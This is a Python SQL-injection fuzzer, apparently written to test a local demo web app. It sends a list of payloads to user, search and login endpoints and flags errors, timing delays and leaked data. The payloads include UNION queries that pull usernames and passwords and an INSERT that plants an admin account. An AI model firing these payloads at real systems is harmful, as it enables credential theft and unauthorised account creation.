import time
import requests
from dataclasses import dataclass, field
from typing import List, Optional


                                                                                
                 
                                                                                

SQLI_PAYLOADS = [
                           
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "1 OR 1=1",
                 
    "admin'--",
    "' OR 'x'='x",
                                        
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,username,password FROM users--",
                 
    "'",
    "''",
    "';--",
                        
    "' OR SLEEP(2)--",
    "1; SELECT pg_sleep(2)--",
                     
    "'; INSERT INTO users (username,password,role) VALUES ('pwned','x','admin')--",
               
    "' OR 'a'='a",
    "1 OR 'unusual'='unusual'",
]

                                                        
DB_ERROR_SIGNATURES = [
    "sqlite3.operationalerror",
    "operational error",
    "syntax error",
    "unrecognized token",
    "no such column",
    "near \"or\":",
    "near \"union\":",
    "sqlite",
    "you have an error in your sql syntax",          
    "pg_exception",                                        
]

                                               
DATA_LEAK_SIGNATURES = [
    "password",
    "secret123",
    "qwerty",
    "letmein",
    "admin",
    "alice",
    "bob",
    "charlie",
]


                                                                                
              
                                                                                

@dataclass
class FuzzHit:
    endpoint: str
    method: str
    param: str
    payload: str
    status_code: int
    response_snippet: str
    anomaly_type: str                                                        
    baseline_time: float            
    fuzz_time: float                
    confirmed: bool = False


@dataclass
class FuzzResult:
    endpoint: str
    hits: List[FuzzHit] = field(default_factory=list)
    payloads_tried: int = 0

    @property
    def vulnerable(self) -> bool:
        return len(self.hits) > 0

    @property
    def best_payload(self) -> Optional[str]:
        if self.hits:
            return self.hits[0].payload
        return None


                                                                                
             
                                                                                

class SQLiFuzzer:

    def __init__(self, base_url: str, timeout: float = 5.0, time_threshold: float = 1.5):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.time_threshold = time_threshold                                         

                                                                               

    def _detect_anomaly(
        self,
        response: requests.Response,
        baseline_time: float,
        fuzz_time: float,
    ) -> Optional[str]:
        body = response.text.lower()

        if response.status_code == 500:
            return "STATUS_500"
        for sig in DB_ERROR_SIGNATURES:
            if sig in body:
                return "DB_ERROR"
        for sig in DATA_LEAK_SIGNATURES:
            if sig in body:
                return "DATA_LEAK"
        if fuzz_time - baseline_time > self.time_threshold:
            return "TIME_ANOMALY"
        return None

    def _get_baseline(self, url: str, method: str, param: str, safe_value: str) -> float:
        try:
            t0 = time.perf_counter()
            if method == "GET":
                requests.get(url, params={param: safe_value}, timeout=self.timeout)
            else:
                requests.post(url, json={param: safe_value}, timeout=self.timeout)
            return time.perf_counter() - t0
        except Exception:
            return 0.1

    def _snippet(self, text: str, max_len: int = 200) -> str:
        text = text.replace("\n", " ").strip()
        return text[:max_len] + ("…" if len(text) > max_len else "")

                                                                                

    def fuzz_get(self, path: str, param: str, safe_value: str = "1") -> FuzzResult:
        url = self.base_url + path
        result = FuzzResult(endpoint=f"GET {path}?{param}=")
        baseline_time = self._get_baseline(url, "GET", param, safe_value)

        for payload in SQLI_PAYLOADS:
            result.payloads_tried += 1
            try:
                t0 = time.perf_counter()
                resp = requests.get(url, params={param: payload}, timeout=self.timeout)
                fuzz_time = time.perf_counter() - t0
            except requests.Timeout:
                fuzz_time = self.timeout
                resp = type("R", (), {"status_code": 0, "text": ""})()

            anomaly = self._detect_anomaly(resp, baseline_time, fuzz_time)
            if anomaly:
                result.hits.append(FuzzHit(
                    endpoint=f"GET {path}",
                    method="GET",
                    param=param,
                    payload=payload,
                    status_code=resp.status_code,
                    response_snippet=self._snippet(resp.text),
                    anomaly_type=anomaly,
                    baseline_time=baseline_time,
                    fuzz_time=fuzz_time,
                    confirmed=True,
                ))
                break                                            

        return result

                                                                                

    def fuzz_post_json(self, path: str, param: str, extra_fields: dict = None) -> FuzzResult:
        url = self.base_url + path
        result = FuzzResult(endpoint=f"POST {path} [{param}]")
        baseline_time = self._get_baseline(url, "POST", param, "safe_value")
        extra = extra_fields or {}

        for payload in SQLI_PAYLOADS:
            result.payloads_tried += 1
            body = {param: payload, **extra}
            try:
                t0 = time.perf_counter()
                resp = requests.post(url, json=body, timeout=self.timeout)
                fuzz_time = time.perf_counter() - t0
            except requests.Timeout:
                fuzz_time = self.timeout
                resp = type("R", (), {"status_code": 0, "text": ""})()

            anomaly = self._detect_anomaly(resp, baseline_time, fuzz_time)
            if anomaly:
                result.hits.append(FuzzHit(
                    endpoint=f"POST {path}",
                    method="POST",
                    param=param,
                    payload=payload,
                    status_code=resp.status_code,
                    response_snippet=self._snippet(resp.text),
                    anomaly_type=anomaly,
                    baseline_time=baseline_time,
                    fuzz_time=fuzz_time,
                    confirmed=True,
                ))
                break

        return result

                                                                                

    def fuzz_all(self) -> List[FuzzResult]:
        results = []
        results.append(self.fuzz_get("/api/user", "id", safe_value="1"))
        results.append(self.fuzz_get("/api/search", "q", safe_value="alice"))
        results.append(self.fuzz_post_json(
            "/api/login", "username",
            extra_fields={"password": "anything"},
        ))
        results.append(self.fuzz_post_json(
            "/api/login", "password",
            extra_fields={"username": "alice"},
        ))
        return results


                                                                                
def format_results(results: List[FuzzResult]) -> str:
    lines = []
    for r in results:
        status = "🔴 VULNERABLE" if r.vulnerable else "🟢 clean"
        lines.append(f"  {status}  {r.endpoint}  ({r.payloads_tried} payloads tried)")
        for h in r.hits:
            lines.append(f"    payload  : {h.payload!r}")
            lines.append(f"    anomaly  : {h.anomaly_type}")
            lines.append(f"    response : {h.response_snippet}")
    return "\n".join(lines)


                                                                                
if __name__ == "__main__":
    import sys
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5001"
    print(f"Fuzzing {base} …")
    fuzzer = SQLiFuzzer(base)
    results = fuzzer.fuzz_all()
    vulnerable_count = sum(1 for r in results if r.vulnerable)
    print(f"\nFuzz complete — {vulnerable_count}/{len(results)} endpoints vulnerable\n")
    print(format_results(results))
